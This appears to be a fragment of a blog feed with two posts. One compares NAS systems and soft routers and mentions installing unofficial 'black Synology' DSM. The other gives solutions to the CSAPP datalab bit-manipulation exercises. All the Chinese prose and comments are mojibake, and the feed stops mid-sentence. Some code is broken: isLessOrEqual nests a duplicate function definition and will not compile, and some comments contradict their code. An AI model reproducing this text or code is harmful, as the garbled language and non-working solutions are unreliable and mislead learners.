    <content type="html"><![CDATA[<h2 id="naså’Œè½¯è·¯ç”±ä½œç”¨"><a href="#naså’Œè½¯è·¯ç”±ä½œç”¨" class="headerlink" title="naså’Œè½¯è·¯ç”±ä½œç”¨"></a>naså’Œè½¯è·¯ç”±ä½œç”¨</h2><p>å¯¹äºæ™®é€šäººæ¥è¯´ï¼Œnasçš„æœ€å¤§ä½œç”¨å°±æ˜¯å¤‡ä»½ç³»ç»Ÿï¼ˆå…¨ç³»ç»Ÿå¤‡ä»½ï¼‰ä»¥åŠä½œä¸ºå¤–éƒ¨å­˜å‚¨ç©ºé—´æ¥ä½¿ç”¨äº†ï¼Œå…¶æ¬¡å°±æ˜¯è¿œç¨‹è®¿é—®nasä¸­çš„ç”µå½±/å‰§ï¼Œè¿˜æœ‰æ–¹ä¾¿çš„å…±äº«æ–‡ä»¶å’Œäº‘åä½œã€æŒ‚ç€ä¸‹è½½bt/ptäº†ã€‚ä¸€èˆ¬å±€åŸŸç½‘è®¿é—®æœ‰110M/sçš„é€Ÿåº¦ï¼Œ2.5Gä¹Ÿæœ‰250M/sä¸Šä¸‹çš„é€Ÿåº¦ï¼Œåªè¦ä¸æ˜¯è§†é¢‘åˆ¶ä½œè€…å’Œå•åä½¿ç”¨è€…ï¼Œè¿™åº”è¯¥å¾ˆè¶³å¤Ÿä½¿ç”¨ã€‚</p><p>naså¦‚æœæœ‰è§†é¢‘è¾“å‡ºæ¥å£ï¼Œæˆ–è€…å®¶åº­ç”¨çš„æ™ºèƒ½ç”µè§†ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å®‰è£…è½¯ä»¶ï¼Œè‡ªåŠ¨æ‰«æç¡¬ç›˜ä¸Šçš„ç”µå½±èµ„æºï¼Œè‡ªåŠ¨è·å–å±•ç¤ºæµ·æŠ¥ç­‰ï¼Œä½œä¸ºå®¶åº­å½±éŸ³ä¸­å¿ƒã€‚</p><p>è€Œè½¯è·¯ç”±ï¼Œé™¤äº†ä½œä¸ºèµ·é£åœ°ç‚¹ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æµæ§ï¼Œè¿˜å¯ä»¥ç©é«˜ç«¯è·¯ç”±å™¨æ‰ç©å¾—èµ·çš„ä¸œè¥¿ï¼ˆå› ä¸ºæˆ‘ä¹Ÿæ²¡å’‹ç©è¿‡hhhï¼‰ã€‚è½¯è·¯ç”±å¯ä»¥åœ¨nasé‡Œèµ·ä¸€ä¸ªè™šæ‹Ÿæœº/dockerå°±èƒ½ç©ï¼Œè¿™æ ·æ›´åŠ æ–¹ä¾¿äº†ã€‚</p><h2 id="nasçš„å‡ å¤§ç³»ç»Ÿå’Œè½¯ç¡¬ç»“åˆå‚å•†"><a href="#nasçš„å‡ å¤§ç³»ç»Ÿå’Œè½¯ç¡¬ç»“åˆå‚å•†" class="headerlink" title="nasçš„å‡ å¤§ç³»ç»Ÿå’Œè½¯ç¡¬ç»“åˆå‚å•†"></a>nasçš„å‡ å¤§ç³»ç»Ÿå’Œè½¯ç¡¬ç»“åˆå‚å•†</h2><h3 id="ç¾¤æ™–ï¼ˆæ•´æœºï¼‰"><a href="#ç¾¤æ™–ï¼ˆæ•´æœºï¼‰" class="headerlink" title="ç¾¤æ™–ï¼ˆæ•´æœºï¼‰"></a>ç¾¤æ™–ï¼ˆæ•´æœºï¼‰</h3><p>æœ€å…ˆè¦è¯´çš„å½“ç„¶æ˜¯ç¾¤æ™–ï¼Œè´µï¼Œå¯èƒ½æ˜¯æˆ‘çš„ç¼ºç‚¹ï¼Œæ˜“ä¸Šæ‰‹ï¼Œè¿™æ˜¯çœŸçš„å¥½ï¼Œuiè¿˜ä¸é”™ï¼Œä¸ªäººæ„Ÿè§‰åå‘ubuntuç³»ç»Ÿé£æ ¼ï¼Œé…å¤‡çš„è½¯ä»¶ä¹Ÿå¾ˆé½å…¨ï¼Œæ¯”å¦‚windwos/linuxéƒ½å¯ä»¥é€šè¿‡è‡ªå®¶çš„è½¯ä»¶æ¥å®ç°å®šæ—¶å¤‡ä»½ã€‚è¿˜æœ‰åºå¤§çš„æ’ä»¶å¸‚åœºå¯ä»¥ç©è€ï¼Œä½†åœ¨æ‰‹æœºä¸Šï¼Œappå¤šï¼ŒåŠŸèƒ½é‡å ä¹Ÿæ˜¯ä¸€å¤§é—®é¢˜ã€‚</p><p>ä½†æ˜¯é»‘ç¾¤æ™–å°±å¥½ç©äº†ï¼Œè¿‘å‡ å¹´çš„x86éƒ½å¯ä»¥åˆ·ä¸Šé»‘ç¾¤æ™–ç©è€ï¼Œé™¤äº†ç¡¬ä»¶è½¬ç å’Œä»–ä»¬è‡ªå®¶çš„å†…ç½‘ç©¿é€éœ€è¦ç™½ç¾¤æ™–è®¤è¯ï¼ˆç©¿é€ä¸å»ºè®®ç™½å«–ï¼‰ï¼Œå¤§ä½“åŠŸèƒ½æ˜¯æ²¡æœ‰ä»€ä¹ˆé—®é¢˜çš„ã€‚æ‰¾å¥½å¼•å¯¼ï¼Œåˆ·åœ¨uç›˜ä¸Šï¼Œå¾€ç”µè„‘ä¸€æ’ç„¶ååˆ·å…¥åŸºç¡€ç³»ç»Ÿï¼Œå°±å¯ä»¥é€šè¿‡ä»–ä»¬å®¶çš„åœ¨çº¿å®‰è£…dsmç³»ç»Ÿäº†ï¼ˆä¸è¿‡è¿˜æ˜¯å»ºè®®é€‰æ‹©ç½‘ä¸Šç»™çš„dsmç³»ç»Ÿï¼‰</p><p>è‡³äºé˜µåˆ—æˆ‘å°±ä¸å¤šè¯´äº†ï¼Œç¾¤æ™–æœ‰ä¸ªSHRé˜µåˆ—ï¼Œè¿™ä¸ªæ¯”è¾ƒå»ºè®®å¤šä¸ªç›˜ç›¸åŒå®¹é‡ã€‚2T * 2çš„æƒ…å†µä¸‹ä¼šæœ‰2Tä¸“é—¨ç”¨æ¥å†—ä½™å’Œæ•°æ®ä¿æŠ¤ï¼Œè€Œ2T * 3ï¼Œ *4ç”šè‡³ *5çš„æƒ…å†µä¸‹ï¼Œè¿˜æ˜¯åªç”¨2Tæ¥ç”¨äºæ•°æ®ä¿æŠ¤ï¼Œåäº†ä¸€ä¸ªç›˜æ•°æ®ä¹Ÿå®Œå…¨æ²¡æœ‰é—®é¢˜ã€‚ </p><h3 id="freenasï¼ˆç³»ç»Ÿï¼‰"><a href="#freenasï¼ˆç³»ç»Ÿï¼‰" class="headerlink" title="freenasï¼ˆç³»ç»Ÿï¼‰"></a>freenasï¼ˆç³»ç»Ÿï¼‰</h3><p>å®‰è£…å¯èƒ½ç¡¬æ ¸ä¸€ç‚¹ï¼Œä½†æ”¯æŒå¹¿ã€‚freenas è‡ªå¸¦çš„zfsç³»ç»ŸæŒºæœ‰æ„æ€çš„ï¼Œä¼šåœ¨å†™å…¥æ•°æ®çš„æ—¶å€™æ”¾åœ¨ä¸€å—æ–°çš„ç©ºé—´é‡Œï¼Œå†™å®Œä¹‹åæ‰æ›´æ–°æ•°æ®æŒ‡å‘ï¼Œè¿™æ ·è‡ªç„¶è€Œç„¶å¯ä»¥æ‹¥æœ‰å¿«ç…§åŠŸèƒ½ï¼Œè¿˜å¸¦æœ‰æ•°æ®æ ¡éªŒç­‰åŠŸèƒ½ã€‚ç•Œé¢æœ‰webç®¡ç†åå°çš„æ„Ÿè§‰hhhï¼Œæ•°æ®å±•ç¤ºæ¯”è¾ƒå¤šæ¯”è¾ƒç‚«é…·ï¼Œæ±‰åŒ–æœ‰ä½†è¿˜ä¸æ˜¯å®Œå…¨æ±‰åŒ–ã€‚</p><h3 id="å¨è”é€šï¼ˆæ•´æœºï¼‰"><a href="#å¨è”é€šï¼ˆæ•´æœºï¼‰" class="headerlink" title="å¨è”é€šï¼ˆæ•´æœºï¼‰"></a>å¨è”é€šï¼ˆæ•´æœºï¼‰</h3><p>ç³»ç»Ÿuiæ¯”ç¾¤æ™–è¿˜è¦é«˜çº§å¥½çœ‹ä¸€ç‚¹ï¼Œä½†æ˜¯ç³»ç»Ÿè®¾ç½®æ–¹é¢è·Ÿè´´è¿‘äºç¡¬æ ¸ç©å®¶çš„ä½¿ç”¨ä¹ æƒ¯hhhhï¼Œæ¯”ç¾¤æ™–ä¾¿å®œç‚¹ä½†ä¹Ÿä¾¿å®œä¸åˆ°å“ªå»ï¼ˆæ‰¶é¢ï¼‰</p><h3 id="unraidï¼ˆç³»ç»Ÿï¼‰"><a href="#unraidï¼ˆç³»ç»Ÿï¼‰" class="headerlink" title="unraidï¼ˆç³»ç»Ÿï¼‰"></a>unraidï¼ˆç³»ç»Ÿï¼‰</h3><p>äº†è§£ä¸å¤šã€‚ã€‚ã€‚</p><h3 id="openmediavautlï¼ˆç³»ç»Ÿï¼‰"><a href="#openmediavautlï¼ˆç³»ç»Ÿï¼‰" class="headerlink" title="openmediavautlï¼ˆç³»ç»Ÿï¼‰"></a>openmediavautlï¼ˆç³»ç»Ÿï¼‰</h3><p>äº†è§£ä¸å¤šã€‚ã€‚ã€‚</p><p>æˆ‘ç ”ç©¶çš„è¿˜æ˜¯é»‘ç¾¤æ™–æ¯”è¾ƒå¤šä¸€ç‚¹ï¼Œæ¯•ç«Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼ŒåŠ ä¸Šæˆ‘çœ‹çš„æ•™ç¨‹è§†é¢‘ï¼ŒæŠ˜è…¾çš„ä¹Ÿæ˜¯é»‘ç¾¤æ™–ï¼Œç¨å¾®äº†è§£äº†ä¸€ç‚¹åˆ«çš„å°±æ‹æ¿æŠ˜è…¾é»‘ç¾¤æ™–äº†ã€‚å› ä¸ºå®¿èˆç»å¸¸å®šæ—¶æ–­ç”µï¼ˆåŠä¸ªæœˆç”µè´¹ç”¨å®Œå¿…æ–­ä¸€æ¬¡ç”µæ‰å»å……é’±ï¼‰ï¼Œä¸ºäº†ä¿æŠ¤å®è´µçš„ç¡¬ç›˜ä»¬è¿˜æœ‰æˆ‘çš„ç”µè„‘ï¼ŒåˆèŠ±äº†ç‚¹ç‚¹é’±ä¹°äº†ä¸ªupsç©ç©ï¼ˆæŠ˜è…¾æ°¸æ— æ­¢å¢ƒhhhï¼‰</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP_lab</title>
    <link href="/2020/08/22/CSAPP_lab/"/>
    <url>/2020/08/22/CSAPP_lab/</url>
    
    <content type="html"><![CDATA[<h2 id="datalab"><a href="#datalab" class="headerlink" title="datalab"></a>datalab</h2><p>æ­£æ•°ç”¨<strong>åŸç </strong>è¡¨ç¤ºçš„ï¼Œè´Ÿæ•°ç”¨<strong>è¡¥ç </strong>è¡¨ç¤º</p><blockquote><p>è¡¥ç ï¼šæ­£æ•°çš„è¡¥ç å°±æ˜¯å…¶åŸç ï¼›<strong>è´Ÿæ•°çš„åç +1</strong>å°±æ˜¯è¡¥ç </p><p>å¦‚å•å­—èŠ‚5ï¼Œåœ¨è®¡ç®—æœºä¸­å°±è¡¨ç¤ºä¸ºï¼š0000 0101ã€‚è´Ÿæ•°ç”¨è¡¥ç è¡¨ç¤ºï¼Œå¦‚å•å­—èŠ‚-5ï¼Œåœ¨è®¡ç®—æœºä¸­è¡¨ç¤ºä¸º1111 1011ã€‚</p></blockquote><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="hljs-comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="hljs-comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">allOddBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> ALL_A = <span class="hljs-number">0xAAAAAAAA</span>;<span class="hljs-comment">//10101010101010101010101010101010</span><br>  <span class="hljs-keyword">return</span> !((x &amp; ALL_A) ^ ALL_A);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span><br><span class="hljs-comment"> *   Example: isAsciiDigit(0x35) = 1.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x3a) = 0.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x05) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-comment">// x &gt; 0x30 &amp;&amp; x &lt; 0x39</span><br>  <span class="hljs-keyword">int</span> TMIN = <span class="hljs-number">0x80000000</span>; <span class="hljs-comment">// 10000000000000000000000000000000</span><br>  <span class="hljs-keyword">int</span> minus0x30 = ~<span class="hljs-number">0x30</span> + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> !((x + minus0x30) &amp; TMIN) <span class="hljs-comment">// x - 0x30 &gt; 0</span><br>    &amp;&amp; !((<span class="hljs-number">0x39</span> - x) &amp; TMIN); <span class="hljs-comment">// 0x39 - x &gt; 0</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="conditional-x-y-z"><a href="#conditional-x-y-z" class="headerlink" title="conditional x ? y : z"></a>conditional x ? y : z</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * conditional - same as x ? y : z </span><br><span class="hljs-comment"> *   Example: conditional(3,4,5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 16</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">conditional</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y, <span class="hljs-keyword">int</span> z)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> x1 = !!x;<span class="hljs-comment">//if x==0, x1 = 1 else x1 = 0</span><br>  x = ~x1+<span class="hljs-number">1</span>;<span class="hljs-comment">//if x1 == 1, x = 111111111...11 else x =0</span><br>  <span class="hljs-keyword">return</span> (x&amp;y)|(~x&amp;z);<br>  <span class="hljs-comment">//if x =11111... 1111 ,(x &amp; y) = y,( ~x &amp; z) = 0</span><br><span class="hljs-comment">//if x = 0 , (x &amp; Î³ã€• = 0, (~x &amp; z) = z</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> diff_sign = ((x &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>)         <span class="hljs-comment">// x &lt; 0</span><br>                  &amp; (((y &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>) ^ <span class="hljs-number">1</span>);<span class="hljs-comment">// y &gt; 0</span><br>  <span class="hljs-keyword">int</span> same_sign = (((x &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>)        <span class="hljs-comment">// same equals 1</span><br>                  ^ ((y &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>) ^ <span class="hljs-number">1</span>); <span class="hljs-comment">// not the same euqals 0</span><br>  <span class="hljs-keyword">int</span> x_minus_y = (((x + (~y)) &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> diff_sign || ( same_sign &amp;&amp; x_minus_y);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h4><p>x &lt;= y çš„æ¡ä»¶ç­‰ä»·äº</p><ul><li><p>xï¼Œyå¼‚å·ã€‚<code>sign(x) == 1 &amp;&amp; sing(y) == 0</code>ï¼Œå³<code>sign(x) &amp; (sign(y) ^ 1)</code></p><blockquote><p>Sign(x) {</p><p>â€‹    return ((x &gt;&gt; 31) &amp; 1); // é€»è¾‘ä½ç§»ï¼Œè¯¦è§ä¸‹</p><p>}</p><p>å¦‚æœä¸ºè´Ÿæ•°ï¼Œè¿”å›1</p><p>æ­£æ•°ï¼Œè¿”å›0</p></blockquote></li><li><p>xï¼ŒyåŒå·ã€‚</p></li></ul><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">1</span>.<span class="hljs-built_in">sign</span>(x) == <span class="hljs-built_in">sign</span>(y) =&gt; (<span class="hljs-built_in">sign</span>(x) ^ <span class="hljs-built_in">sign</span>(y) ^ <span class="hljs-number">1</span>)<br><span class="hljs-number">2</span>.x - y &lt;= <span class="hljs-number">0</span><br>=&gt; x - y &lt; <span class="hljs-number">1</span><br>=&gt; x + (~y+<span class="hljs-number">1</span>) &lt; <span class="hljs-number">1</span><br>=&gt; x + (~y) &lt; <span class="hljs-number">1</span><br>=&gt; <span class="hljs-built_in">sign</span>(x + (~y))<br></code></pre></td></tr></table></figure><blockquote><p><a href="https://www.cnblogs.com/sinkinben/p/12323784.html">æ¥æº&amp;å‚è€ƒ-æœ€å¤§æ•°å€¼</a></p></blockquote><h4 id="é€»è¾‘ä½ç§»ç®—æ•°ä½ç§»"><a href="#é€»è¾‘ä½ç§»ç®—æ•°ä½ç§»" class="headerlink" title="é€»è¾‘ä½ç§»ç®—æ•°ä½ç§»"></a>é€»è¾‘ä½ç§»ç®—æ•°ä½ç§»</h4><p>é€»è¾‘å³ç§»åªå°†äºŒè¿›åˆ¶æ•°æ•´ä½“å³ç§»ï¼Œ<strong>å·¦è¾¹è¡¥0</strong>ï¼Œå±è”½äº†å³ç§»å¸¦å‡ºæ¥çš„ç¬¦å·ä½</p><p>ç®—æœ¯ä½ç§»ï¼Œå·¦è¾¹è¡¥ä¸Šç¬¦å·ä½ã€‚</p><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><blockquote><p>å½“ xâ‰ 0xâ‰ 0 æ—¶ï¼Œx|(âˆ’x)x|(âˆ’x) çš„ç¬¦å·ä½å¿…ç„¶ä¸º 1</p><p><a href="https://mcginn7.github.io/2020/02/14/CSAPP-datalab/#isLessOrEqual-x-y">æ¥æº</a></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalNeg - implement the ! operator, using all of </span><br><span class="hljs-comment"> *              the legal operators except !</span><br><span class="hljs-comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">logicalNeg</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> ((x | (~x + <span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">31</span>)+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* howManyBits - return the minimum number of bits required to represent x in</span><br><span class="hljs-comment"> *             two&#x27;s complement</span><br><span class="hljs-comment"> *  Examples: howManyBits(12) = 5</span><br><span class="hljs-comment"> *            howManyBits(298) = 10</span><br><span class="hljs-comment"> *            howManyBits(-5) = 4</span><br><span class="hljs-comment"> *            howManyBits(0)  = 1</span><br><span class="hljs-comment"> *            howManyBits(-1) = 1</span><br><span class="hljs-comment"> *            howManyBits(0x80000000) = 32</span><br><span class="hljs-comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *  Max ops: 90</span><br><span class="hljs-comment"> *  Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">howManyBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> b16,b8,b4,b2,b1,b0;<br>  <span class="hljs-keyword">int</span> sign=x&gt;&gt;<span class="hljs-number">31</span>;<br>  x = (sign&amp;~x)|(~sign&amp;x);<span class="hljs-comment">//å¦‚æœx&gt;0, åˆ™x = x, å¦åˆ™x = ~x</span><br>  <br>  b16 = !!(x&gt;&gt;<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">4</span>;<span class="hljs-comment">//é«˜åå…­ä½æœ‰1ï¼Œåˆ™b16 = 2^4 = 16, å¦åˆ™b16 = 0</span><br>  x = x&gt;&gt;b16;<br>  b8 = !!(x&gt;&gt;<span class="hljs-number">8</span>)&lt;&lt;<span class="hljs-number">3</span>;<br>  x = x&gt;&gt;b8;<br>  b4 = !!(x&gt;&gt;<span class="hljs-number">4</span>)&lt;&lt;<span class="hljs-number">2</span>;<br>  x = x&gt;&gt;b4;<br>  b2 = !!(x&gt;&gt;<span class="hljs-number">2</span>)&lt;&lt;<span class="hljs-number">1</span>;<br>  x = x&gt;&gt;b2;<br>  b1 = !!(x&gt;&gt;<span class="hljs-number">1</span>);<br>  x = x&gt;&gt;b1;<br>  b0 = x;<br>  <span class="hljs-keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="hljs-number">1</span>;<span class="hljs-comment">//+1è¡¨ç¤ºåŠ ä¸Šç¬¦å·ä½</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">floatScale2</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> exp_const = <span class="hljs-number">0x7f800000</span>; <span class="hljs-comment">// 01111111100000000000000000000000</span><br>    <span class="hljs-keyword">int</span> frac_const = <span class="hljs-number">0x7fffff</span>;  <span class="hljs-comment">// 00000000011111111111111111111111</span><br>    <span class="hljs-keyword">int</span> exp = (uf &amp; exp_const)&gt;&gt;<span class="hljs-number">23</span>; <span class="hljs-comment">// get exp part</span><br>    <span class="hljs-keyword">int</span> frac = uf &amp; frac_const;     <span class="hljs-comment">// get frac part</span><br>    <span class="hljs-keyword">int</span> sign = uf &gt;&gt; <span class="hljs-number">31</span>;            <span class="hljs-comment">// get sign</span><br>    <span class="hljs-keyword">int</span> sign_bit = sign &lt;&lt; <span class="hljs-number">31</span>;<br>    <span class="hljs-keyword">if</span> (exp == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> uf &lt;&lt; <span class="hljs-number">1</span> | sign_bit; <span class="hljs-comment">// exp = 0, not a correct format</span><br>    <span class="hljs-keyword">if</span> (exp == <span class="hljs-number">255</span>) <span class="hljs-keyword">return</span> uf; <span class="hljs-comment">// When argument is NaN, return argument</span><br>    <span class="hljs-keyword">return</span> ((exp + <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">23</span>) | frac | sign_bit;<span class="hljs-comment">// ç»„åˆåœ¨ä¸€èµ·</span><br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>1ä½ç¬¦å·ä½ï¼Œ8ä½expï¼Œ23ä½frac</p><p>å¦‚125.125ï¼ˆ10è¿›åˆ¶ï¼‰</p><p>è½¬æ¢æˆäºŒè¿›åˆ¶<code>1111101.001</code>(äºŒè¿›åˆ¶)ï¼Œå†è½¬æ¢æˆæµ®ç‚¹æ•°æ ‡å‡†æ ¼å¼</p><p><code>1.111101001 * 2^6</code> </p><p>6ä»£è¡¨ç‚¹å‘å·¦ç§»åŠ¨äº†å‡ ä½ï¼ŒåŠ 